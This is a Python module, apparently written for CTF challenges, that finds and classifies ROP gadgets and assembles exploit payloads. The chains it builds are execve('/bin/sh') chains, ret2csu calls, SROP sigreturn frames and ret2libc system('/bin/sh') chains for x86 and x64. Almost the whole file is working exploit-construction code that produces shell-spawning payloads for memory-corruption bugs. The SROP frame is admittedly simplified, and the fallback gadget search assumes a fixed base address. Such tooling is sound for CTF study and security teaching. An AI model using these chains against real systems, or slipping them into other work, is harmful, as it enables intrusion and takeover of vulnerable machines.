"""
ROP Chain Builder for CTF Challenges

Automated Return-Oriented Programming chain construction:
- Gadget finding and classification
- execve("/bin/sh") chain building
- ret2csu technique
- SROP (Sigreturn Oriented Programming)
- ret2libc chains
"""

import struct
import logging
import re
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Tuple, Union, Any
from enum import Enum, auto

logger = logging.getLogger(__name__)


class Architecture(Enum):
    """Target architecture."""
    X86 = "x86"
    X64 = "x64"


class GadgetType(Enum):
    """Types of ROP gadgets."""
    POP_REG = auto()      # pop reg; ret
    MOV_REG = auto()      # mov reg, reg; ret
    XOR_REG = auto()      # xor reg, reg; ret
    ADD_REG = auto()      # add reg, val; ret
    SUB_REG = auto()      # sub reg, val; ret
    SYSCALL = auto()      # syscall; ret or int 0x80; ret
    LEAVE_RET = auto()    # leave; ret
    CALL_REG = auto()     # call reg
    JMP_REG = auto()      # jmp reg
    WRITE_MEM = auto()    # mov [reg], reg; ret
    READ_MEM = auto()     # mov reg, [reg]; ret
    RET = auto()          # ret
    CUSTOM = auto()       # Other useful gadgets


@dataclass
class Gadget:
    """Represents a ROP gadget."""
    address: int
    instructions: str
    gadget_type: GadgetType
    registers: List[str] = field(default_factory=list)
    size: int = 0

    def __repr__(self) -> str:
        return f"Gadget(0x{self.address:x}: {self.instructions})"

    def pack(self, arch: Architecture) -> bytes:
        """Pack gadget address for the architecture."""
        if arch == Architecture.X64:
            return struct.pack("<Q", self.address)
        return struct.pack("<I", self.address)


@dataclass
class ROPChain:
    """Represents a complete ROP chain."""
    chain: List[Union[int, bytes]] = field(default_factory=list)
    description: str = ""
    arch: Architecture = Architecture.X64
    gadgets_used: List[Gadget] = field(default_factory=list)

    def add(self, value: Union[int, bytes, Gadget]) -> "ROPChain":
        """Add a value to the chain."""
        if isinstance(value, Gadget):
            self.chain.append(value.address)
            self.gadgets_used.append(value)
        elif isinstance(value, bytes):
            # Add raw bytes as-is
            self.chain.append(value)
        else:
            self.chain.append(value)
        return self

    def add_padding(self, count: int = 1) -> "ROPChain":
        """Add padding (typically 'AAAA' or 'AAAAAAAA')."""
        if self.arch == Architecture.X64:
            for _ in range(count):
                self.chain.append(0x4141414141414141)
        else:
            for _ in range(count):
                self.chain.append(0x41414141)
        return self

    def build(self) -> bytes:
        """Build the final payload."""
        result = b""
        for item in self.chain:
            if isinstance(item, bytes):
                result += item
            elif isinstance(item, int):
                if self.arch == Architecture.X64:
                    result += struct.pack("<Q", item & 0xFFFFFFFFFFFFFFFF)
                else:
                    result += struct.pack("<I", item & 0xFFFFFFFF)
        return result

    def __len__(self) -> int:
        """Return length of chain in bytes."""
        return len(self.build())

    def dump(self) -> str:
        """Dump chain for debugging."""
        lines = [f"ROP Chain ({self.description}):"]
        ptr_size = 8 if self.arch == Architecture.X64 else 4
        offset = 0

        for i, item in enumerate(self.chain):
            if isinstance(item, bytes):
                lines.append(f"  [{offset:04x}] {item.hex()} (raw bytes)")
                offset += len(item)
            else:
                lines.append(f"  [{offset:04x}] 0x{item:0{ptr_size*2}x}")
                offset += ptr_size

        return "\n".join(lines)


class ROPBuilder:
    """
    Automated ROP chain builder for CTF exploitation.

    Features:
    - Gadget database management
    - Chain construction helpers
    - Common technique implementations (ret2libc, execve, etc.)
    """

    # Common x64 register names
    X64_REGS = ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rbp", "rsp",
                "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]

    # Common x86 register names
    X86_REGS = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"]

    # x64 syscall numbers
    X64_SYSCALLS = {
        "read": 0,
        "write": 1,
        "open": 2,
        "close": 3,
        "execve": 59,
        "exit": 60,
        "mprotect": 10,
    }

    # x86 syscall numbers
    X86_SYSCALLS = {
        "exit": 1,
        "read": 3,
        "write": 4,
        "open": 5,
        "execve": 11,
        "mprotect": 125,
    }

    def __init__(self,
                 arch: Architecture = Architecture.X64,
                 binary_path: Optional[str] = None):
        """
        Initialize ROP builder.

        Args:
            arch: Target architecture
            binary_path: Path to binary (for gadget extraction)
        """
        self.arch = arch
        self.binary_path = binary_path
        self.gadgets: Dict[str, Gadget] = {}
        self.gadget_list: List[Gadget] = []

        # Common addresses (to be filled)
        self.binsh_addr: Optional[int] = None
        self.system_addr: Optional[int] = None
        self.exit_addr: Optional[int] = None
        self.libc_base: Optional[int] = None

        # ret2csu gadgets
        self.csu_init_addr: Optional[int] = None
        self.csu_call_addr: Optional[int] = None

    def analyze_binary(self) -> Dict[str, Any]:
        """
        Analyze binary to extract gadgets and useful addresses.

        Returns:
            Dictionary with analysis results
        """
        if not self.binary_path:
            return {"error": "No binary path specified"}

        results = {
            "gadgets_found": 0,
            "has_syscall": False,
            "has_binsh": False,
            "protections": {},
        }

        try:
            # Try to use ROPgadget if available
            import subprocess
            cmd = ["ROPgadget", "--binary", self.binary_path]
            output = subprocess.check_output(cmd, text=True, timeout=60)

            for line in output.split("\n"):
                gadget = self._parse_ropgadget_line(line)
                if gadget:
                    self._add_gadget(gadget)
                    results["gadgets_found"] += 1

        except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired) as e:
            logger.warning(f"ROPgadget failed: {e}")
            # Fall back to manual analysis
            self._manual_gadget_search()

        # Check for /bin/sh string
        results["has_binsh"] = self.binsh_addr is not None
        results["has_syscall"] = "syscall" in self.gadgets or "int_0x80" in self.gadgets

        return results

    def _parse_ropgadget_line(self, line: str) -> Optional[Gadget]:
        """Parse a line from ROPgadget output."""
        # Format: 0x0000000000401234 : pop rdi ; ret
        match = re.match(r"(0x[0-9a-fA-F]+)\s*:\s*(.+)", line.strip())
        if not match:
            return None

        addr = int(match.group(1), 16)
        instructions = match.group(2).strip()

        gadget_type = self._classify_gadget(instructions)
        registers = self._extract_registers(instructions)

        return Gadget(
            address=addr,
            instructions=instructions,
            gadget_type=gadget_type,
            registers=registers
        )

    def _classify_gadget(self, instructions: str) -> GadgetType:
        """Classify a gadget based on its instructions."""
        instr_lower = instructions.lower()

        if instr_lower.startswith("pop") and "ret" in instr_lower:
            return GadgetType.POP_REG
        if "syscall" in instr_lower:
            return GadgetType.SYSCALL
        if "int 0x80" in instr_lower:
            return GadgetType.SYSCALL
        if instr_lower.startswith("mov") and "ret" in instr_lower:
            if "[" in instr_lower:
                return GadgetType.WRITE_MEM if instr_lower.index("[") < instr_lower.index(",") else GadgetType.READ_MEM
            return GadgetType.MOV_REG
        if instr_lower.startswith("xor") and "ret" in instr_lower:
            return GadgetType.XOR_REG
        if instr_lower.startswith("add") and "ret" in instr_lower:
            return GadgetType.ADD_REG
        if instr_lower == "ret":
            return GadgetType.RET
        if "leave" in instr_lower and "ret" in instr_lower:
            return GadgetType.LEAVE_RET
        if instr_lower.startswith("call"):
            return GadgetType.CALL_REG
        if instr_lower.startswith("jmp"):
            return GadgetType.JMP_REG

        return GadgetType.CUSTOM

    def _extract_registers(self, instructions: str) -> List[str]:
        """Extract register names from instructions."""
        regs = self.X64_REGS if self.arch == Architecture.X64 else self.X86_REGS
        found = []

        for reg in regs:
            if reg in instructions.lower():
                found.append(reg)

        return found

    def _add_gadget(self, gadget: Gadget) -> None:
        """Add gadget to the database."""
        self.gadget_list.append(gadget)

        # Index by useful patterns
        instr = gadget.instructions.lower()

        if gadget.gadget_type == GadgetType.POP_REG:
            for reg in gadget.registers:
                key = f"pop_{reg}"
                if key not in self.gadgets:
                    self.gadgets[key] = gadget

        if "syscall" in instr:
            self.gadgets["syscall"] = gadget
        if "int 0x80" in instr:
            self.gadgets["int_0x80"] = gadget
        if instr == "ret":
            self.gadgets["ret"] = gadget

    def _manual_gadget_search(self) -> None:
        """Search for gadgets manually if ROPgadget unavailable."""
        if not self.binary_path:
            return

        try:
            with open(self.binary_path, "rb") as f:
                data = f.read()

            # Search for common gadget patterns
            # pop rdi; ret = 0x5f 0xc3
            # pop rsi; ret = 0x5e 0xc3
            # syscall; ret = 0x0f 0x05 0xc3

            patterns = {
                b"\x5f\xc3": ("pop rdi ; ret", "pop_rdi"),
                b"\x5e\xc3": ("pop rsi ; ret", "pop_rsi"),
                b"\x5a\xc3": ("pop rdx ; ret", "pop_rdx"),
                b"\x58\xc3": ("pop rax ; ret", "pop_rax"),
                b"\x59\xc3": ("pop rcx ; ret", "pop_rcx"),
                b"\x0f\x05\xc3": ("syscall ; ret", "syscall"),
                b"\xc3": ("ret", "ret"),
            }

            # Note: This is simplified - real implementation would need
            # to account for base address from ELF headers

            for pattern, (desc, key) in patterns.items():
                offset = data.find(pattern)
                if offset != -1:
                    # Assume base address of 0x400000 for demonstration
                    addr = 0x400000 + offset
                    gadget = Gadget(
                        address=addr,
                        instructions=desc,
                        gadget_type=self._classify_gadget(desc),
                        registers=self._extract_registers(desc)
                    )
                    self.gadgets[key] = gadget
                    self.gadget_list.append(gadget)

        except IOError as e:
            logger.error(f"Failed to read binary: {e}")

    def add_gadget(self, address: int, name: str, instructions: str = "") -> None:
        """
        Manually add a gadget to the database.

        Args:
            address: Gadget address
            name: Identifier for the gadget (e.g., "pop_rdi")
            instructions: Disassembly (optional)
        """
        gadget = Gadget(
            address=address,
            instructions=instructions or name,
            gadget_type=self._classify_gadget(instructions or name),
            registers=self._extract_registers(instructions or name)
        )
        self.gadgets[name] = gadget
        self.gadget_list.append(gadget)

    def find_gadget(self, pattern: str) -> Optional[Gadget]:
        """
        Find gadget matching a pattern.

        Args:
            pattern: Gadget identifier or regex pattern

        Returns:
            Matching Gadget or None
        """
        # Try exact match first
        if pattern in self.gadgets:
            return self.gadgets[pattern]

        # Try pattern matching
        pattern_re = re.compile(pattern, re.IGNORECASE)
        for gadget in self.gadget_list:
            if pattern_re.search(gadget.instructions):
                return gadget

        return None

    def build_execve_chain(self,
                          binsh_addr: Optional[int] = None,
                          command: str = "/bin/sh") -> ROPChain:
        """
        Build execve("/bin/sh", NULL, NULL) chain.

        For x64:
          rax = 59 (execve syscall number)
          rdi = address of "/bin/sh"
          rsi = 0 (NULL argv)
          rdx = 0 (NULL envp)
          syscall

        Args:
            binsh_addr: Address of "/bin/sh" string
            command: Command to execute (used if binsh_addr not provided)

        Returns:
            ROPChain for execve
        """
        chain = ROPChain(arch=self.arch, description="execve('/bin/sh', NULL, NULL)")

        if self.arch == Architecture.X64:
            return self._build_execve_x64(chain, binsh_addr)
        else:
            return self._build_execve_x86(chain, binsh_addr)

    def _build_execve_x64(self, chain: ROPChain, binsh_addr: Optional[int]) -> ROPChain:
        """Build x64 execve chain."""
        binsh = binsh_addr or self.binsh_addr
        if not binsh:
            raise ValueError("No /bin/sh address provided")

        # Set up rdi = binsh_addr
        pop_rdi = self.find_gadget("pop_rdi")
        if pop_rdi:
            chain.add(pop_rdi)
            chain.add(binsh)

        # Set up rsi = 0
        pop_rsi = self.find_gadget("pop_rsi")
        if pop_rsi:
            chain.add(pop_rsi)
            chain.add(0)  # NULL argv
            # Some pop rsi gadgets also pop r15
            if "r15" in pop_rsi.instructions.lower():
                chain.add(0)

        # Set up rdx = 0
        pop_rdx = self.find_gadget("pop_rdx")
        if pop_rdx:
            chain.add(pop_rdx)
            chain.add(0)  # NULL envp
        else:
            # Try xor rdx, rdx
            xor_rdx = self.find_gadget("xor.*rdx.*rdx")
            if xor_rdx:
                chain.add(xor_rdx)

        # Set up rax = 59 (execve)
        pop_rax = self.find_gadget("pop_rax")
        if pop_rax:
            chain.add(pop_rax)
            chain.add(59)

        # syscall
        syscall = self.find_gadget("syscall")
        if syscall:
            chain.add(syscall)
        else:
            raise ValueError("No syscall gadget found")

        return chain

    def _build_execve_x86(self, chain: ROPChain, binsh_addr: Optional[int]) -> ROPChain:
        """Build x86 execve chain."""
        binsh = binsh_addr or self.binsh_addr
        if not binsh:
            raise ValueError("No /bin/sh address provided")

        # For x86: ebx = binsh, ecx = 0, edx = 0, eax = 11, int 0x80

        # Set up ebx
        pop_ebx = self.find_gadget("pop_ebx")
        if pop_ebx:
            chain.add(pop_ebx)
            chain.add(binsh)

        # Set up ecx = 0
        pop_ecx = self.find_gadget("pop_ecx")
        if pop_ecx:
            chain.add(pop_ecx)
            chain.add(0)
        else:
            xor_ecx = self.find_gadget("xor.*ecx.*ecx")
            if xor_ecx:
                chain.add(xor_ecx)

        # Set up edx = 0
        pop_edx = self.find_gadget("pop_edx")
        if pop_edx:
            chain.add(pop_edx)
            chain.add(0)

        # Set up eax = 11
        pop_eax = self.find_gadget("pop_eax")
        if pop_eax:
            chain.add(pop_eax)
            chain.add(11)

        # int 0x80
        int_80 = self.find_gadget("int_0x80")
        if int_80:
            chain.add(int_80)
        else:
            raise ValueError("No int 0x80 gadget found")

        return chain

    def build_ret2csu_chain(self,
                           call_addr: int,
                           arg1: int = 0,
                           arg2: int = 0,
                           arg3: int = 0) -> ROPChain:
        """
        Build ret2csu chain for calling arbitrary functions.

        Uses __libc_csu_init gadgets to control rdi, rsi, rdx and call
        a function pointer.

        Args:
            call_addr: Address of function pointer to call
            arg1: First argument (rdi)
            arg2: Second argument (rsi)
            arg3: Third argument (rdx)

        Returns:
            ROPChain using ret2csu technique
        """
        if self.arch != Architecture.X64:
            raise ValueError("ret2csu is x64 only")

        if not self.csu_init_addr or not self.csu_call_addr:
            raise ValueError("CSU gadgets not set. Use set_csu_gadgets()")

        chain = ROPChain(arch=self.arch, description="ret2csu")

        # First gadget (csu_init): sets rbx, rbp, r12, r13, r14, r15
        # Typically at __libc_csu_init + 0x5a
        chain.add(self.csu_init_addr)
        chain.add(0)                 # rbx = 0
        chain.add(1)                 # rbp = 1 (to pass rbx+1 == rbp check)
        chain.add(call_addr)         # r12 = function pointer address
        chain.add(arg3)              # r13 -> rdx
        chain.add(arg2)              # r14 -> rsi
        chain.add(arg1)              # r15 -> rdi (or edi depending on version)

        # Second gadget (csu_call): calls [r12] with args
        # Typically at __libc_csu_init + 0x40
        chain.add(self.csu_call_addr)

        # Need 7 qwords of padding (56 bytes) for the add rsp, 8 and pops
        for _ in range(7):
            chain.add(0x4141414141414141)

        return chain

    def set_csu_gadgets(self, csu_init: int, csu_call: int) -> None:
        """
        Set ret2csu gadget addresses.

        Args:
            csu_init: Address of pop rbx; pop rbp; pop r12-r15; ret
            csu_call: Address of mov rdx, r13; mov rsi, r14; ... call [r12+rbx*8]
        """
        self.csu_init_addr = csu_init
        self.csu_call_addr = csu_call

    def build_sigreturn_chain(self,
                             rip: int,
                             rsp: int = 0,
                             rax: int = 0,
                             rdi: int = 0,
                             rsi: int = 0,
                             rdx: int = 0) -> ROPChain:
        """
        Build SROP (Sigreturn Oriented Programming) chain.

        Uses sigreturn syscall to set arbitrary register values.

        Args:
            rip: Target instruction pointer
            rsp: Stack pointer (optional)
            rax, rdi, rsi, rdx: Register values to set

        Returns:
            ROPChain with sigreturn frame
        """
        if self.arch != Architecture.X64:
            raise ValueError("This SROP implementation is x64 only")

        chain = ROPChain(arch=self.arch, description="SROP")

        # Need to set rax = 15 (sigreturn syscall number)
        pop_rax = self.find_gadget("pop_rax")
        if pop_rax:
            chain.add(pop_rax)
            chain.add(15)  # rt_sigreturn

        # syscall to trigger sigreturn
        syscall = self.find_gadget("syscall")
        if syscall:
            chain.add(syscall)

        # Build sigreturn frame (simplified - full frame is 296 bytes)
        # This is the sigcontext structure that sigreturn will restore

        frame = self._build_sigreturn_frame(
            rip=rip,
            rsp=rsp or 0x7fff0000,  # Default stack
            rax=rax,
            rdi=rdi,
            rsi=rsi,
            rdx=rdx
        )

        chain.add(frame)

        return chain

    def _build_sigreturn_frame(self, **regs) -> bytes:
        """Build a sigreturn frame for x64."""
        # Simplified sigcontext structure
        # Full structure has 296 bytes with many fields

        frame = b""

        # uc_flags, uc_link (16 bytes)
        frame += struct.pack("<QQ", 0, 0)

        # uc_stack (24 bytes)
        frame += struct.pack("<QQQ", 0, 0, 0)

        # sigcontext starts here
        # r8-r15 (64 bytes)
        frame += struct.pack("<Q", 0) * 8

        # rdi
        frame += struct.pack("<Q", regs.get('rdi', 0))
        # rsi
        frame += struct.pack("<Q", regs.get('rsi', 0))
        # rbp
        frame += struct.pack("<Q", 0)
        # rbx
        frame += struct.pack("<Q", 0)
        # rdx
        frame += struct.pack("<Q", regs.get('rdx', 0))
        # rax
        frame += struct.pack("<Q", regs.get('rax', 0))
        # rcx
        frame += struct.pack("<Q", 0)
        # rsp
        frame += struct.pack("<Q", regs.get('rsp', 0))
        # rip
        frame += struct.pack("<Q", regs.get('rip', 0))
        # eflags
        frame += struct.pack("<Q", 0)
        # cs, gs, fs, etc.
        frame += struct.pack("<HHHH", 0x33, 0, 0, 0)
        # padding
        frame += b"\x00" * 8
        # err, trapno, oldmask, cr2
        frame += struct.pack("<QQQQ", 0, 0, 0, 0)
        # fpstate pointer
        frame += struct.pack("<Q", 0)
        # reserved
        frame += b"\x00" * 64

        return frame

    def build_ret2libc_chain(self,
                            system_addr: int,
                            binsh_addr: int,
                            exit_addr: Optional[int] = None) -> ROPChain:
        """
        Build classic ret2libc chain.

        Args:
            system_addr: Address of system()
            binsh_addr: Address of "/bin/sh" string
            exit_addr: Address of exit() (optional, for clean exit)

        Returns:
            ROPChain for ret2libc
        """
        chain = ROPChain(arch=self.arch, description="ret2libc: system('/bin/sh')")

        if self.arch == Architecture.X64:
            # x64: need to set rdi = binsh_addr before calling system
            pop_rdi = self.find_gadget("pop_rdi")
            if not pop_rdi:
                raise ValueError("No pop rdi gadget - cannot set argument")

            # Might need stack alignment (ret gadget)
            ret = self.find_gadget("ret")
            if ret:
                chain.add(ret)

            chain.add(pop_rdi)
            chain.add(binsh_addr)
            chain.add(system_addr)

            if exit_addr:
                chain.add(pop_rdi)
                chain.add(0)
                chain.add(exit_addr)

        else:
            # x86: arguments on stack
            chain.add(system_addr)
            chain.add(exit_addr or 0x41414141)  # return address
            chain.add(binsh_addr)  # argument

        return chain

    def set_libc_addresses(self,
                          system: int,
                          binsh: int,
                          exit: Optional[int] = None,
                          base: Optional[int] = None) -> None:
        """
        Set common libc addresses.

        Args:
            system: Address of system()
            binsh: Address of "/bin/sh" string
            exit: Address of exit()
            base: libc base address
        """
        self.system_addr = system
        self.binsh_addr = binsh
        self.exit_addr = exit
        self.libc_base = base

    def list_gadgets(self) -> List[Dict[str, Any]]:
        """Return list of all found gadgets."""
        return [
            {
                "address": hex(g.address),
                "instructions": g.instructions,
                "type": g.gadget_type.name,
                "registers": g.registers
            }
            for g in self.gadget_list
        ]


# Convenience functions
def build_execve_chain(gadgets: Dict[str, int],
                      binsh_addr: int,
                      arch: str = "x64") -> bytes:
    """
    Quick function to build execve chain.

    Args:
        gadgets: Dictionary of gadget name -> address
        binsh_addr: Address of "/bin/sh"
        arch: Architecture

    Returns:
        Chain bytes
    """
    architecture = Architecture.X64 if arch == "x64" else Architecture.X86
    builder = ROPBuilder(arch=architecture)

    for name, addr in gadgets.items():
        builder.add_gadget(addr, name)

    builder.binsh_addr = binsh_addr
    chain = builder.build_execve_chain()
    return chain.build()


def build_ret2libc(system: int,
                  binsh: int,
                  pop_rdi: Optional[int] = None,
                  arch: str = "x64") -> bytes:
    """
    Quick function to build ret2libc chain.

    Args:
        system: system() address
        binsh: "/bin/sh" address
        pop_rdi: pop rdi gadget (x64 only)
        arch: Architecture

    Returns:
        Chain bytes
    """
    architecture = Architecture.X64 if arch == "x64" else Architecture.X86
    builder = ROPBuilder(arch=architecture)

    if pop_rdi and architecture == Architecture.X64:
        builder.add_gadget(pop_rdi, "pop_rdi", "pop rdi ; ret")

    chain = builder.build_ret2libc_chain(system, binsh)
    return chain.build()
